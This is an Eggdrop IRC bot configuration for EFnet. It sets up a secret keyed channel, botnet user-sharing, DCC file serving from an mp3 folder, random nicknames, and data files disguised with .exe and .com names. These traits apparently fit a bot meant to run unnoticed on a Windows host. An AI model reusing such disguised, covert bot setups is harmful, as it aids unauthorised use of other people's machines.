#############################
# listen 3333 all
listen 6899 users
set chanfile "254r.exe"
set userfile "254.com"
#set notefile "254r.note"

#############################
#don't change anything below#
#############################
set network "EFnet"
set timezone "EST"
set max-logs 5
set log-time 1
set keep-all-logs 0
set switch-logfiles-at 300
set console "mkcobxs"
set help-path "help/"
set temp-path "temp/"
set motd "motd"
set protect-telnet 0
set ident-timeout 30
set require-p 0
set open-telnets 0
set connect-timeout 0
set dcc-flood-thr 3
set telnet-flood 5:60
# set firewall "24.64.4.164:1080"
# set nat-ip "127.0.0.1"
# set reserved-port 9076
set ignore-time 15
set debug-output 0
set hourly-updates 00
set notify-newusers "HQ"
set owner "x"
set default-flags "hp"
set whois-fields "url birthday"
set remote-boots 2
set share-unlinks 1
set die-on-sighup 0
set die-on-sigterm 0
bind dcc n tcl *dcc:tcl
bind dcc n set *dcc:set
unbind dcc n simul *dcc:simul
#unbind msg o op *msg:op
#unbind msg o op
set max-dcc 150
set enable-simul 1
set allow-dk-cmds 1
set admin "zz"
loadmodule channels
set ban-time 1200
set share-greet 0
set use-info 1
channel add #6bb1 {
  chanmode "+ntsk 789"
  idle-kick 0
  flood-chan 100:60
  flood-deop 3:10
  flood-kick 3:10
  flood-join 5:60
  flood-ctcp 3:60
}
channel set #6bb1 +enforcebans
channel set #6bb1 +dynamicbans
channel set #6bb1 +userbans
channel set #6bb1 -autoop
channel set #6bb1 -bitch
channel set #6bb1 +protectops
channel set #6bb1 +statuslog
channel set #6bb1 -stopnethack
channel set #6bb1 -revenge
channel set #6bb1 +autovoice
channel set #6bb1 +secret
channel set #6bb1 +shared
channel set #6bb1 +cycle
##### SERVER MODULE #####
loadmodule server
set init-server { putserv "MODE $botnick +iw-s" }
set servers {
irc.mcs.net:6667
irc.ins.net.uk:6667
irc.lightning.net:6667
irc.emory.edu:6667
}  
set keep-nick 1
set strict-host 1
set quiet-reject 0
set lowercase-ctcp 0
set answer-ctcp 3
set flood-msg 5:60
set flood-ctcp 3:60
set never-give-up 1
set strict-servernames 0
set default-port 6667
set server-cycle-wait 60
set server-timeout 15
set servlimit 0
set check-stoned 1
set use-console-r 0
set serverror-quit 1
set max-queue-msg 300
set trigger-on-ignore 0
set use-silence 0
set handle-mode_r 1
##### CTCP MODULE #####
# loadmodule ctcp
##### IRC MODULE #####
loadmodule irc
set bounce-bans 0
set kick-method 0
set learn-users 0
set wait-split 300
set wait-info 180
set modes-per-line 4
set mode-buf-length 200
set use-354 0
unbind msg - hello *msg:hello
# bind msg - myword *msg:hello
unbind msg - op *msg:op
unbind msg - ident *msg:ident
bind msg - newident *msg:ident
unbind msg - help *msg:help
##### TRANSFER MODULE #####
loadmodule transfer
set max-dloads 3
set dcc-block 0
set copy-to-tmp 1
set xfer-timeout 300
##### SHARE MODULE #####
loadmodule share
set allow-resync 0
set share-users 1
#set resync-time 900
set private-owner 0
set private-global 0
# set private-user 0
##### FILESYSTEM MODULE #####
loadmodule filesys
set files-path "e:\mp3"
set incoming-path "e:\mp3"
set upload-to-pwd 0
set filedb-path ""
set max-file-users 20
set max-filesize 1024
##### NOTES MODULE #####
loadmodule notes
#set notefile "zzYBot.notes"
set max-notes 50
set note-life 60
set allow-fwd 0
set notify-users 1
##### CONSOLE MODULE #####
loadmodule console
##### variables:
set console-autosave 1
set force-channel 0
set info-party 0
##### SEEN MODULE #####
loadmodule seen
#checkmodule md5
checkmodule blowfish
#####  SCRIPTS  #####

source scripts/alltools.tcl
source scripts/action.fix.tcl
source scripts/netbots.tcl
source scripts/compat.tcl
source scripts/winident1.1.tcl


set nick [string range Timm- 0 1][expr 10 + [rand 999999]]
set altnick [string range Timm- 0 1][expr 10 + [rand 999999]]


